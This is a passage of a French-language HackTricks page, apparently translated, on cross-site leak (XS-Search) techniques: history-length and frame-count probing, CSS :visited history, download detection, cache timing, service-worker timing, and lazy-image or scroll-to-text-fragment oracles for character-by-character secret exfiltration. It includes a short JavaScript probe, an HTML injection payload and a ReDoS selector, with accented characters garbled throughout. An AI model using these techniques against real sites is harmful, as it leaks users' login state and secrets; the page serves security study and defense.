* **R√©sum√© :** Utiliser la limite de redirection du navigateur pour d√©terminer la survenue de redirections d'URL.
* **Exemple de code** : [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si le **nombre max** de **redirections** √† suivre d'un navigateur est **20**, un attaquant pourrait essayer de charger sa page avec **19 redirections** et finalement **envoyer la victime** vers la page test√©e. Si une **erreur** est d√©clench√©e, alors la page essayait de **rediriger la victime**.

### Longueur de l'Historique

* **M√©thodes d'inclusion** : Frames, Pop-ups
* **Diff√©rence d√©tectable** : Redirections
* **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **R√©sum√© :** Le code JavaScript manipule l'historique du navigateur et peut √™tre acc√©d√© par la propri√©t√© length.
* **Exemple de code** : [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

L'**API History** permet au code JavaScript de manipuler l'historique du navigateur, qui **enregistre les pages visit√©es par un utilisateur**. Un attaquant peut utiliser la propri√©t√© length comme m√©thode d'inclusion : pour d√©tecter la navigation JavaScript et HTML.\
**V√©rifiant `history.length`**, en faisant **naviguer** un utilisateur vers une page, **en revenant** √† la m√™me origine et **en v√©rifiant** la nouvelle valeur de **`history.length`**.

### Longueur de l'Historique avec la m√™me URL

* **M√©thodes d'inclusion** : Frames, Pop-ups
* **Diff√©rence d√©tectable** : Si l'URL est la m√™me que celle devin√©e
* **R√©sum√© :** Il est possible de deviner si l'emplacement d'un frame/pop-up est dans une URL sp√©cifique en abusant de la longueur de l'historique.
* **Exemple de code** : Ci-dessous

Un attaquant pourrait utiliser du code JavaScript pour **manipuler l'emplacement du frame/pop-up vers une URL devin√©e** et **imm√©diatement** **le changer en `about:blank`**. Si la longueur de l'historique a augment√©, cela signifie que l'URL √©tait correcte et qu'elle a eu le temps d'**augmenter car l'URL n'est pas recharg√©e si elle est la m√™me**. Si elle n'a pas augment√©, cela signifie qu'elle **a essay√© de charger l'URL devin√©e** mais parce que nous **l'avons imm√©diatement apr√®s** charg√©e **`about:blank`**, la **longueur de l'historique n'a jamais augment√©** lors du chargement de l'URL devin√©e.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** √âvaluer la quantit√© d'√©l√©ments iframe en inspectant la propri√©t√© `window.length`.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Compter le **nombre de frames dans un web** ouvert via `iframe` ou `window.open` peut aider √† identifier le **statut de l'utilisateur sur cette page**.\
De plus, si la page a toujours le m√™me nombre de frames, v√©rifier **en continu** le nombre de frames peut aider √† identifier un **mod√®le** qui pourrait divulguer des informations.

Un exemple de cette technique est que dans chrome, un **PDF** peut √™tre **d√©tect√©** avec **le comptage de frames** car un `embed` est utilis√© en interne. Il existe des [param√®tres d'URL ouverts](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) qui permettent un certain contr√¥le sur le contenu tel que `zoom`, `view`, `page`, `toolbar` o√π cette technique pourrait √™tre int√©ressante.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Lire la valeur divulgu√©e pour distinguer entre 2 √©tats possibles
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La fuite d'informations √† travers des √©l√©ments HTML est une pr√©occupation en mati√®re de s√©curit√© web, en particulier lorsque des fichiers multim√©dias dynamiques sont g√©n√©r√©s en fonction des informations de l'utilisateur, ou lorsque des filigranes sont ajout√©s, modifiant la taille du m√©dia. Cela peut √™tre exploit√© par des attaquants pour diff√©rencier entre des √©tats possibles en analysant les informations expos√©es par certains √©l√©ments HTML.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: Cet √©l√©ment r√©v√®le la `duration` et les temps `buffered` du m√©dia, qui peuvent √™tre accessibles via son API. [En savoir plus sur HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Il expose `videoHeight` et `videoWidth`. Dans certains navigateurs, des propri√©t√©s suppl√©mentaires comme `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, et `webkitDecodedFrameCount` sont disponibles, offrant des informations plus d√©taill√©es sur le contenu multim√©dia. [En savoir plus sur HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Cette fonction fournit des d√©tails sur la qualit√© de lecture vid√©o, y compris `totalVideoFrames`, qui peut indiquer la quantit√© de donn√©es vid√©o trait√©es. [En savoir plus sur getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Cet √©l√©ment divulgue la `height` et la `width` d'une image. Cependant, si une image est invalide, ces propri√©t√©s retourneront 0, et la fonction `image.decode()` sera rejet√©e, indiquant l'√©chec de chargement correct de l'image. [En savoir plus sur HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Identifier les variations dans le style du site web qui correspondent √† l'√©tat ou au statut de l'utilisateur.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Les applications web peuvent changer le **style du site web en fonction du statut de l'utilisateur**. Des fichiers CSS cross-origin peuvent √™tre int√©gr√©s sur la page de l'attaquant avec l'**√©l√©ment de lien HTML**, et les **r√®gles** seront **appliqu√©es** √† la page de l'attaquant. Si une page change dynamiquement ces r√®gles, un attaquant peut **d√©tecter** ces **diff√©rences** en fonction de l'√©tat de l'utilisateur.\
En tant que technique de fuite, l'attaquant peut utiliser la m√©thode `window.getComputedStyle` pour **lire les propri√©t√©s CSS** d'un √©l√©ment HTML sp√©cifique. En cons√©quence, un attaquant peut lire des propri√©t√©s CSS arbitraires si l'√©l√©ment affect√© et le nom de la propri√©t√© sont connus.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** D√©tecter si le style `:visited` est appliqu√© √† une URL indiquant qu'elle a d√©j√† √©t√© visit√©e
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Selon [**ceci**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), cela ne fonctionne pas dans Chrome sans t√™te.
{% endhint %}

Le s√©lecteur CSS `:visited` est utilis√© pour styliser les URL diff√©remment si elles ont √©t√© pr√©c√©demment visit√©es par l'utilisateur. Dans le pass√©, la m√©thode `getComputedStyle()` pouvait √™tre utilis√©e pour identifier ces diff√©rences de style. Cependant, les navigateurs modernes ont mis en ≈ìuvre des mesures de s√©curit√© pour emp√™cher cette m√©thode de r√©v√©ler l'√©tat d'un lien. Ces mesures incluent le retour syst√©matique du style calcul√© comme si le lien avait √©t√© visit√© et la restriction des styles pouvant √™tre appliqu√©s avec le s√©lecteur `:visited`.

Malgr√© ces restrictions, il est possible de discerner l'√©tat visit√© d'un lien de mani√®re indirecte. Une technique consiste √† tromper l'utilisateur pour qu'il interagisse avec une zone affect√©e par le CSS, en utilisant sp√©cifiquement la propri√©t√© `mix-blend-mode`. Cette propri√©t√© permet le m√©lange d'√©l√©ments avec leur arri√®re-plan, r√©v√©lant potentiellement l'√©tat visit√© en fonction de l'interaction de l'utilisateur.

De plus, la d√©tection peut √™tre r√©alis√©e sans interaction de l'utilisateur en exploitant les temps de rendu des liens. √âtant donn√© que les navigateurs peuvent rendre les liens visit√©s et non visit√©s diff√©remment, cela peut introduire une diff√©rence de temps mesurable dans le rendu. Un proof of concept (PoC) a √©t√© mentionn√© dans un rapport de bogue Chromium, d√©montrant cette technique en utilisant plusieurs liens pour amplifier la diff√©rence de timing, rendant ainsi l'√©tat visit√© d√©tectable par analyse de timing.

Pour plus de d√©tails sur ces propri√©t√©s et m√©thodes, visitez leurs pages de documentation :

* `:visited`: [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** Dans Google Chrome, une page d'erreur d√©di√©e est affich√©e lorsqu'une page est bloqu√©e d'√™tre int√©gr√©e sur un site cross-origin en raison des restrictions X-Frame-Options.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Dans Chrome, si une page avec l'en-t√™te `X-Frame-Options` d√©fini sur "deny" ou "same-origin" est int√©gr√©e en tant qu'objet, une page d'erreur appara√Æt. Chrome retourne de mani√®re unique un objet document vide (au lieu de `null`) pour la propri√©t√© `contentDocument` de cet objet, contrairement aux iframes ou √† d'autres navigateurs. Les attaquants pourraient exploiter cela en d√©tectant le document vide, r√©v√©lant potentiellement des informations sur l'√©tat de l'utilisateur, surtout si les d√©veloppeurs d√©finissent de mani√®re incoh√©rente l'en-t√™te X-Frame-Options, n√©gligeant souvent les pages d'erreur. La sensibilisation et l'application coh√©rente des en-t√™tes de s√©curit√© sont cruciales pour pr√©venir de telles fuites.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** Un attaquant peut discerner les t√©l√©chargements de fichiers en utilisant des iframes ; l'accessibilit√© continue de l'iframe implique un t√©l√©chargement de fichier r√©ussi.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

L'en-t√™te `Content-Disposition`, sp√©cifiquement `Content-Disposition: attachment`, indique au navigateur de t√©l√©charger le contenu plut√¥t que de l'afficher en ligne. Ce comportement peut √™tre exploit√© pour d√©tecter si un utilisateur a acc√®s √† une page qui d√©clenche un t√©l√©chargement de fichier. Dans les navigateurs bas√©s sur Chromium, il existe quelques techniques pour d√©tecter ce comportement de t√©l√©chargement :

1. **Surveillance de la barre de t√©l√©chargement** :
* Lorsqu'un fichier est t√©l√©charg√© dans les navigateurs bas√©s sur Chromium, une barre de t√©l√©chargement appara√Æt en bas de la fen√™tre du navigateur.
* En surveillant les changements de la hauteur de la fen√™tre, les attaquants peuvent d√©duire l'apparition de la barre de t√©l√©chargement, sugg√©rant qu'un t√©l√©chargement a √©t√© initi√©.
2. **Navigation de t√©l√©chargement avec des iframes** :
* Lorsqu'une page d√©clenche un t√©l√©chargement de fichier en utilisant l'en-t√™te `Content-Disposition: attachment`, cela ne provoque pas un √©v√©nement de navigation.
* En chargeant le contenu dans une iframe et en surveillant les √©v√©nements de navigation, il est possible de v√©rifier si la disposition du contenu provoque un t√©l√©chargement de fichier (pas de navigation) ou non.
3. **Navigation de t√©l√©chargement sans iframes** :
* Semblable √† la technique iframe, cette m√©thode implique d'utiliser `window.open` au lieu d'une iframe.
* Surveiller les √©v√©nements de navigation dans la nouvelle fen√™tre ouverte peut r√©v√©ler si un t√©l√©chargement de fichier a √©t√© d√©clench√© (pas de navigation) ou si le contenu est affich√© en ligne (navigation se produit).

Dans les sc√©narios o√π seuls les utilisateurs connect√©s peuvent d√©clencher de tels t√©l√©chargements, ces techniques peuvent √™tre utilis√©es pour d√©duire indirectement l'√©tat d'authentification de l'utilisateur en fonction de la r√©ponse du navigateur √† la demande de t√©l√©chargement.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** Un attaquant peut discerner les t√©l√©chargements de fichiers en utilisant des iframes ; l'accessibilit√© continue de l'iframe implique un t√©l√©chargement de fichier r√©ussi.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
C'est pourquoi cette technique est int√©ressante : Chrome a maintenant **le partitionnement du cache**, et la cl√© de cache de la page nouvellement ouverte est : `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mais si j'ouvre une page ngrok et que j'utilise fetch dedans, la cl√© de cache sera : `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **cl√© de cache est diff√©rente**, donc le cache ne peut pas √™tre partag√©. Vous pouvez trouver plus de d√©tails ici : [Gagner en s√©curit√© et en confidentialit√© en partitionnant le cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Commentaire de [**ici**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un site `example.com` inclut une ressource de `*.example.com/resource`, alors cette ressource aura la **m√™me cl√© de cache** que si la ressource √©tait directement **demand√©e par navigation de niveau sup√©rieur**. Cela est d√ª au fait que la cl√© de cache est constitu√©e de _eTLD+1_ de niveau sup√©rieur et de _eTLD+1_ de frame.

Parce qu'acc√©der au cache est plus rapide que de charger une ressource, il est possible d'essayer de changer l'emplacement d'une page et de l'annuler 20 ms (par exemple) apr√®s. Si l'origine a √©t√© chang√©e apr√®s l'arr√™t, cela signifie que la ressource a √©t√© mise en cache.\
Ou il pourrait simplement **envoyer quelques fetch √† la page potentiellement mise en cache et mesurer le temps qu'il faut**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Il est possible de d√©couvrir si une r√©ponse √† une requ√™te fetch est une redirection
* **Code Example**:

![](<../../.gitbook/assets/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Il est possible d'essayer de charger une ressource et d'annuler avant qu'elle ne soit charg√©e. En fonction de si une erreur est d√©clench√©e, la ressource a √©t√© ou n'a pas √©t√© mise en cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Utilisez _**fetch**_ et _**setTimeout**_ avec un **AbortController** pour d√©tecter si la **ressource est mise en cache** et pour √©vincer une ressource sp√©cifique du cache du navigateur. De plus, le processus se d√©roule sans mettre en cache de nouveau contenu.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** Il est possible de **surcharger des fonctions int√©gr√©es** et de lire leurs arguments m√™me depuis **un script cross-origin** (qui ne peut pas √™tre lu directement), cela pourrait **divulguer des informations pr√©cieuses**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Mesurer le temps d'ex√©cution d'un web en utilisant des service workers.
* **Code Example**:

Dans le sc√©nario donn√©, l'attaquant prend l'initiative d'enregistrer un **service worker** dans l'un de ses domaines, sp√©cifiquement "attacker.com". Ensuite, l'attaquant ouvre une nouvelle fen√™tre sur le site web cible depuis le document principal et demande au **service worker** de commencer un chronom√®tre. Lorsque la nouvelle fen√™tre commence √† se charger, l'attaquant navigue vers la r√©f√©rence obtenue dans l'√©tape pr√©c√©dente vers une page g√©r√©e par le **service worker**.

√Ä l'arriv√©e de la requ√™te initi√©e dans l'√©tape pr√©c√©dente, le **service worker** r√©pond avec un code d'√©tat **204 (No Content)**, terminant effectivement le processus de navigation. √Ä ce stade, le **service worker** capture une mesure du chronom√®tre initi√© plus t√¥t √† l'√©tape deux. Cette mesure est influenc√©e par la dur√©e du JavaScript causant des retards dans le processus de navigation.

{% hint style="warning" %}
Dans un timing d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Utilisez [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pour mesurer le temps qu'il faut pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** Utilisez [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pour mesurer le temps qu'il faut pour effectuer une requ√™te en utilisant `window.open`. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour construire et **automatiser facilement des workflows** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Avec HTML ou R√©injection

Ici, vous pouvez trouver des techniques pour exfiltrer des informations d'un HTML cross-origin **en injectant du contenu HTML**. Ces techniques sont int√©ressantes dans les cas o√π pour une raison quelconque vous pouvez **injecter du HTML mais vous ne pouvez pas injecter de code JS**.

### Dangling Markup

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

Si vous devez **exfiltrer du contenu** et que vous pouvez **ajouter du HTML avant le secret**, vous devriez v√©rifier les **techniques de balisage pendantes courantes**.\
Cependant, si pour une raison quelconque vous **DEVEZ** le faire **caract√®re par caract√®re** (peut-√™tre que la communication se fait via un hit de cache), vous pouvez utiliser cette astuce.

**Les images** en HTML ont un attribut "**loading**" dont la valeur peut √™tre "**lazy**". Dans ce cas, l'image sera charg√©e lorsqu'elle sera vue et non pendant le chargement de la page :
```html
<img src=/something loading=lazy >
```
Par cons√©quent, ce que vous pouvez faire est d'**ajouter beaucoup de caract√®res inutiles** (par exemple **des milliers de "W"**) pour **remplir la page web avant le secret ou ajouter quelque chose comme** `<br><canvas height="1850px"></canvas><br>.`\
Ensuite, si par exemple notre **injection appara√Æt avant le drapeau**, l'**image** serait **charg√©e**, mais si elle appara√Æt **apr√®s** le **drapeau**, le drapeau + les caract√®res inutiles **emp√™cheront son chargement** (vous devrez jouer avec la quantit√© de caract√®res inutiles √† placer). C'est ce qui s'est pass√© dans [**ce rapport**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Une autre option serait d'utiliser le **scroll-to-text-fragment** si cela est autoris√© :

#### Scroll-to-text-fragment

Cependant, vous faites en sorte que le **bot acc√®de √† la page** avec quelque chose comme
```
#:~:text=SECR
```
La page web sera quelque chose comme : **`https://victim.com/post.html#:~:text=SECR`**

O√π post.html contient les caract√®res ind√©sirables de l'attaquant et une image √† chargement paresseux, puis le secret du bot est ajout√©.

Ce texte fera en sorte que le bot acc√®de √† tout texte sur la page contenant le texte `SECR`. Comme ce texte est le secret et qu'il est juste **en dessous de l'image**, l'**image ne se chargera que si le secret devin√© est correct**. Vous avez donc votre oracle pour **exfiltrer le secret caract√®re par caract√®re**.

Un exemple de code pour exploiter cela : [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Chargement d'Image Paresseux Bas√© sur le Temps

S'il est **impossible de charger une image externe** qui pourrait indiquer √† l'attaquant que l'image a √©t√© charg√©e, une autre option serait d'essayer de **deviner le caract√®re plusieurs fois et de mesurer cela**. Si l'image est charg√©e, toutes les requ√™tes prendraient plus de temps que si l'image n'est pas charg√©e. C'est ce qui a √©t√© utilis√© dans la [**solution de ce rapport**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **r√©sum√©e ici :**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si `jQuery(location.hash)` est utilis√©, il est possible de d√©couvrir via le timing **si un contenu HTML existe**, cela est d√ª au fait que si le s√©lecteur `main[id='site-main']` ne correspond pas, il n'est pas n√©cessaire de v√©rifier le reste des **s√©lecteurs** :
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Injection CSS

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## D√©fenses

Il existe des att√©nuations recommand√©es dans [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ainsi que dans chaque section du wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consultez ces ressources pour plus d'informations sur la protection contre ces techniques.

## R√©f√©rences

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des workflows** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
